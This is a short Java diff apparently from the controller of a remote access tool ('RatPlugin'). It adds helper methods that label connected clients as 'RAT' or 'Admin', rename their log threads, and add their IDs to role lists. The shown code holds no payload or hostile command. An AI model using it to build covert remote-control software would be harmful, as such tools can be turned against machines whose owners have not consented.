@@ -56,6 +56,18 @@ public class ClientUtils
        return instance.ratsID.lastIndexOf(client.id) != -1;
     }
 
+    public static void makeRat(Client client,RatPlugin instance)
+    {
+        client.name = "RAT " + client.id;
+        client.log.setName("RAT Thread " + client.id);
+        client.programlog.setName("RAT Program " + client.id);
+    }
+
+    public static void addToRatList(Client client,RatPlugin instance)
+    {
+        instance.ratsID.add(client.id);
+    }
+
     public static void removeFromRatList(Client client,RatPlugin instance)
     {
         if (isRat(client,instance))
@@ -65,6 +77,21 @@ public class ClientUtils
     public static boolean isAdmin(Client client,RatPlugin instance)
     {
         return instance.adminsID.lastIndexOf(client.id) != -1;
+    }
+
+    public static void makeAdmin(Client client,RatPlugin instance,boolean json)
+    {
+        if (json)
+            client.setEncoder(instance.jsonEncoder);
+
+        client.name = "Admin " + client.id;
+        client.log.setName("Admin Thread " + client.id);
+        client.programlog.setName("Admin Program " + client.id);
+    }
+
+    public static void addToAdminList(Client client,RatPlugin instance)
+    {
+        instance.adminsID.add(client.id);
     }
 
     public static void removeFromAdminList(Client client,RatPlugin instance)
